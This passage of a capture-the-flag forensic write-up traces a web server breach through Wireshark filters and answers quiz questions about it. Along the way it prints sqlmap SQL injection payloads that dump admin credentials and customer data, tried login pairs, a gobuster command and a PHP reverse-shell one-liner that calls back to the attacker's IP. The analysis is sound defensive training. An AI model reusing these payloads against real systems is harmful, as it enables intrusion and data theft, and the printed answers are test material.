            <inband query="SELECT schemaname,tablename FROM pg_tables" condition="schemaname" query2="SELECT table_schema,table_name FROM information_schema.tables" condition2="table_schema"/>
            <blind query="SELECT tablename FROM pg_tables WHERE schemaname='%s' ORDER BY tablename OFFSET %d LIMIT 1" count="SELECT COUNT(tablename) FROM pg_tables WHERE schemaname='%s'" query2="SELECT table_name FROM information_schema.tables WHERE table_schema='%s' OFFSET %d LIMIT 1" count2="SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='%s'"/>
        </tables>
        <columns>
            <inband query="SELECT attname,typname FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' AND nspname='%s' ORDER BY attname" condition="attname"/>
            <blind query="SELECT attname FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' AND nspname='%s' ORDER BY attname" query2="SELECT typname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relname='%s' AND a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND attname='%s' AND nspname='%s' ORDER BY attname" count="SELECT COUNT(attname) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' AND nspname='%s'" condition="attname"/>
        </columns>
        ...
```

**Oracle**
```xml
    <dbms value="Oracle">
        <cast query="CAST(%s AS VARCHAR(4000))"/>
        <length query="LENGTH(%s)"/>
        <isnull query="NVL(%s,' ')"/>
        <delimiter query="||"/>
        ...
        <!-- NOTE: in Oracle schema names are the counterpart to database names on other DBMSes -->
        <dbs>
            <inband query="SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)"/>
            <blind query="SELECT OWNER FROM (SELECT OWNER,ROWNUM AS CAP FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE CAP=%d" count="SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES"/>
        </dbs>
        <tables>
            <inband query="SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES" condition="OWNER"/>
            <blind query="SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM AS CAP FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE CAP=%d" count="SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE OWNER='%s'"/>
        </tables>
        ... 
```

Each databases has slightly different queries and detecting which queries the server accepts in this scenario could help us answer the question. 

By inspecting the payloads in previous questions, we identified multiple SQLi methods used by adversary such as basic [Inline Query](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/inline_query.xml) with few samples like:
```sql
GET /search.php?search=test’ OR 1=1; -- HTTP/1.1
GET /search.php?search=' or 1=1; -- - HTTP/1.1
GET /search.php?search=book and 1=1; -- - HTTP/1.1
GET /search.php?search=book and 1=2; -- - HTTP/1.1
```

or Union Query like:
```sql
GET /search.php?search=book&ZscL=7696 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables ... HTTP/1.1

GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(CONCAT('qxvbq',JSON_ARRAYAGG(...)),'qvpjq') FROM INFORMATION_SCHEMA.SCHEMATA-- - HTTP/1.1

GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(...,JSON_ARRAYAGG(CONCAT_WS(...,table_name)),...) FROM INFORMATION_SCHEMA.TABLES ... HTTP/1.1
```

And at the end of adversary's sqlmap scan, we detected few interesting events:

```sql
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,table_name)),0x7176706a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x626f6f6b776f726c645f6462)-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,password,username)),0x7176706a71) FROM bookworld_db.`admin`-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x637573746f6d657273 AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,address,email,first_name,id,last_name,phone)),0x7176706a71) FROM bookworld_db.customers-- - HTTP/1.1 
GET /search.php?search=book HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,column_name,column_type)),0x7176706a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x626f6f6b73 AND table_schema=0x626f6f6b776f726c645f6462-- - HTTP/1.1 
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,title)),0x7176706a71) FROM bookworld_db.books-- - HTTP/1.1 
```

First we observed `GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -` which matchs the MySQL queries example for querying Database metadata. 

The server responsed with HTTP 200, indicating the adversary sucessfully exfiltrated database information

```sql
ip.addr == 111.224.250.131 && http.user_agent contains "sqlmap" && http.request.method == GET && frame contains "INFORMATION_SCHEMA.SCHEMATA"|| http.response.code == 200
```

![pic13](assets/images/cyberdefender/webinvestigation/pic13.png)

> ANSWER: `/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -`
{: .prompt-info }

#### Q6: Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?

Following from previous question, not only exfiltrated database information, we identified other malicious activities.

- **Exfiltrated adminitrator information from database `bookwork_db` included id, username and password**
  
```sql
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,password,username)),0x7176706a71) FROM bookworld_db.`admin`-- - HTTP/1.1 
```

Wireshark filter indicating adversary successfully exfiltrated admin information from `bookwork_db`
```sql
ip.addr == 111.224.250.131 && http.user_agent contains "sqlmap" && http.request.method == GET && frame contains "bookworld_db"|| http.response.code == 200
```
![pic14](assets/images/cyberdefender/webinvestigation/pic14.png)

- **Exfiltrated sensitive data from clients from database `bookwork_db` included their PIIs**
  
```sql
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,address,email,first_name,id,last_name,phone)),0x7176706a71) FROM bookworld_db.customers-- - HTTP/1.1 
```
Wireshark filter indicating adversary successfully exfiltrated customer's PII from `bookwork_db`.
![pic15](assets/images/cyberdefender/webinvestigation/pic15.png)

> ANSWER: `customers`
{: .prompt-info }

#### Q7: The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide the name of the directory discovered by the attacker?

Beside exploiting compromised server by SQL injection, we also obverserved the use of [Gobuster](https://github.com/OJ/gobuster) - a well-known tool for directory / file brute forcing (We indicated it by inspect User-Agent strings).

So not only exfiltrated sensitive data from database, the adversary was try to scan the compromised server to identify hidden directories on the web server.

As you know, or maybe not, to use Gobuster, user must have a list of pre-defined directories, files, etc, below is one of basic Gobuster's command use to enumerate web server:
```bash
gobuster dir -u https://example.com -w /path/to/wordlist.txt
```

Base on `wordlist.txt`, it might contains hundreds, thounsands or maybe....zillions of entries, so it's not efficient to filter user-agent strings contains `gobuster` and find out which one is the right answer, because it definitely gonna be a tedieous work, instead, we would like to filter ONLY HTTP REPONSE CODE 302 between IP addresses of the web server and the adversary and inspect application field to indicate which hidden path has been discovered.

```sql
ip.src == 73.124.22.98 and ip.dst == 111.224.250.131 and http.response.code == 302
```
We did a great job, our filter hit 2 events !

![pic16](assets/images/cyberdefender/webinvestigation/pic16.png)

Also, there's a worthnothy event, adversary found the login page (`/admin/login.php`) for administrator - 5 minutes after he/shes found hidden path `/admin/`. 

![pic17](assets/images/cyberdefender/webinvestigation/pic17.png)

> ANSWER: `/admin/`
{: .prompt-info } 

#### Q8: Knowing which credentials were used allows us to determine the extent of account compromise. What are the credentials used by the attacker for logging in?

By correlate previous question and question number 6, we knew adversary might used exfiltrated admin information from `bookwork_db.`

```sql
GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,password,username)),0x7176706a71) FROM bookworld_db.`admin`-- - HTTP/1.1 
```

And use this credential to login into Administrator page. To hunting which credential has been used, we could extract information from traffic flow (Adversary -> Server) and their interaction with the discovered hidden path.

```sql
ip.dst == 73.124.22.98 and ip.src == 111.224.250.131 and frame contains "/admin/login.php" and http.request.method == POST
```

![pic18](assets/images/cyberdefender/webinvestigation/pic18.png)

`HTML Form URL Encoded` field contains credential information, but there were 4 set of user:password has been used by the adversary:
- `admin`:`admin`
- `admin`:`changeme`
- `default`:`default`
- `admin`:`admin123!`'

Which one is the correct credential ? We could extract those information by finding associate response from compromised webserver. 

```sql
frame contains "/admin/" and http.request.method == POST || http.response.code == 200 || http.response.code == 302
```

![pic19](assets/images/cyberdefender/webinvestigation/pic19.png)

> ANSWER: `admin:admin123!`
{: .prompt-info }

#### Q9: We need to determine if the attacker gained further access or control of our web server. What's the name of the malicious script uploaded by the attacker?

By identified adversary's TTPs, which is using valid account to login into admininistrator web page (`index.php`), we could investigate further their activities on the web page by look into their requests.

```sql
ip.src ==  111.224.250.131 and http.request.method == POST and frame contains "index.php"
```
![pic20](assets/images/cyberdefender/webinvestigation/pic20.png)

1 event associated with above filter, we identified adversary uploaded a file name `NVri2vhp.php`:

```bash
Frame 88757: 1122 bytes on wire (8976 bits), 1122 bytes captured (8976 bits)
Ethernet II, Src: VMware_c0:00:0a (00:50:56:c0:00:0a), Dst: VMware_6c:76:5f (00:0c:29:6c:76:5f)
Internet Protocol Version 4, Src: 111.224.250.131, Dst: 73.124.22.98
Transmission Control Protocol, Src Port: 50076, Dst Port: 80, Seq: 1, Ack: 1, Len: 1056
Hypertext Transfer Protocol
MIME Multipart Media Encapsulation, Type: multipart/form-data, Boundary: "---------------------------356779360015075940041229236053"
    [Type: multipart/form-data]
    First boundary: -----------------------------356779360015075940041229236053\r\n
    Encapsulated multipart part:  (application/x-php)
        Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"\r\n
        Content-Type: application/x-php\r\n\r\n
        Media Type
            Media type: application/x-php (79 bytes)
    Boundary: \r\n-----------------------------356779360015075940041229236053\r\n
    Encapsulated multipart part: 
        Content-Disposition: form-data; name="submit"\r\n\r\n
        Data (11 bytes)
            Data: 55706c6f61642046696c65
            [Length: 11]
    Last boundary: \r\n-----------------------------356779360015075940041229236053--\r\n
```

Even more interesting, inspect HEX / ASCII panel, the file uploaded by adversary was a TCP reverse shell.

![pic21](assets/images/cyberdefender/webinvestigation/pic21.png)

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>
```

> ANSWER: `NVri2vhp.php`
{: .prompt-info }

